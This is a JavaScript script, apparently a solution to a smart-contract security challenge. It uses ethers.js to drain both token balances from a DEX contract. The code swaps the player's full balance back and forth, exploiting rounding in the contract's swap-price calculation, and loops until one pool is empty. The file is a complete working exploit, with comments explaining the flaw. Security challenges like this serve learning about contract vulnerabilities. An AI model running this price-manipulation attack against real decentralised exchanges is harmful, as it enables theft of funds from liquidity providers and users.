const { ethers } = require("ethers");
require('dotenv').config();

// Provider
const provider = new ethers.JsonRpcProvider(process.env.RPC);

// Wallet
const player = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

// Challenge specific variables
const dexAddress = "0x85fAb4cfd7C35E0B881EA137751E2B97881d9849";
const token1Address = "0x017BF0CD63b3B8FFEB9f50305f08fe114aD3FDE4";
const token2Address = "0x4aFfBEDD604b07D21462A529552EEe958Bfa1aCD";

const dexAbi = [
    "function getSwapPrice(address, address, uint256) view returns (uint256)",
    "function balanceOf(address, address) view returns (uint256)",

    "function approve(address, uint256)",
    "function swap(address, address, uint256)",
];

// Contracts
const dex = new ethers.Contract(dexAddress, dexAbi, player);

// Main function
const main = async () => {
    console.log('Start');

    // This hack leverages the fact that price calculation does not protect
    // from unexpected rounding.
    // By always swapping the max amount of one token, the amount received
    // on the other token will be greater.
    // We can do that until we empty the pool from one of the tokens
    let dexBalanceToken1 = await dex.balanceOf(token1Address, dexAddress);
    let dexBalanceToken2 = await dex.balanceOf(token2Address, dexAddress);
    let playerBalanceToken1 = await dex.balanceOf(token1Address, player.address);
    let playerBalanceToken2 = await dex.balanceOf(token2Address, player.address);
    let iteration = 1;

    // Set approvals to the max
    const tx = await dex.approve(dexAddress, 1000000);
    await tx.wait();

    // While loop until we empty the pool from one of the tokens 
    while (dexBalanceToken1 > 0 && dexBalanceToken2 > 0) {
        console.log();
        console.log(`Iteration ${iteration}`);
        console.log(`Balance of token1 in DEX is ${dexBalanceToken1}`);
        console.log(`Balance of token2 in DEX is ${dexBalanceToken2}`);
        console.log(`Balance of token1 in player is ${playerBalanceToken1}`);
        console.log(`Balance of token2 in player is ${playerBalanceToken2}`);

        // We swap the whole balance of the token we have
        if (playerBalanceToken1 == 0) {
            let amountToSwap = playerBalanceToken2;
            let expectedToken1Amount = await dex.getSwapPrice(token2Address, token1Address, amountToSwap);
            console.log(`Swapping ${amountToSwap} of token2 to ${expectedToken1Amount} of token1`);
            if (expectedToken1Amount > dexBalanceToken1) {
                amountToSwap = dexBalanceToken2;
                expectedToken1Amount = await dex.getSwapPrice(token2Address, token1Address, amountToSwap);
                console.log(`Not enough balance on DEX`);
                console.log(`Changing... Swapping ${amountToSwap} of token2 to ${expectedToken1Amount} of token1`);
            }
            const tx = await dex.swap(token2Address, token1Address, amountToSwap);
            await tx.wait();
        } else {
            let amountToSwap = playerBalanceToken1;
            let expectedToken2Amount = await dex.getSwapPrice(token1Address, token2Address, amountToSwap);
            console.log(`Swapping ${amountToSwap} of token1 to ${expectedToken2Amount} of token2`);
            if (expectedToken2Amount > dexBalanceToken2) {
                amountToSwap = dexBalanceToken1;
                expectedToken2Amount = await dex.getSwapPrice(token1Address, token2Address, amountToSwap);
                console.log(`Not enough balance on DEX`);
                console.log(`Changing... Swapping ${amountToSwap} of token1 to ${expectedToken2Amount} of token2`);
            }
            const tx = await dex.swap(token1Address, token2Address, amountToSwap);
            await tx.wait();
        }

        // Update values
        iteration++;
        dexBalanceToken1 = await dex.balanceOf(token1Address, dexAddress);
        dexBalanceToken2 = await dex.balanceOf(token2Address, dexAddress);
        playerBalanceToken1 = await dex.balanceOf(token1Address, player.address);
        playerBalanceToken2 = await dex.balanceOf(token2Address, player.address);
    }

    console.log();
    console.log('Final balances:');
    console.log(`Balance of token1 in DEX is ${dexBalanceToken1}`);
    console.log(`Balance of token2 in DEX is ${dexBalanceToken2}`);
    console.log(`Balance of token1 in player is ${playerBalanceToken1}`);
    console.log(`Balance of token2 in player is ${playerBalanceToken2}`);
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });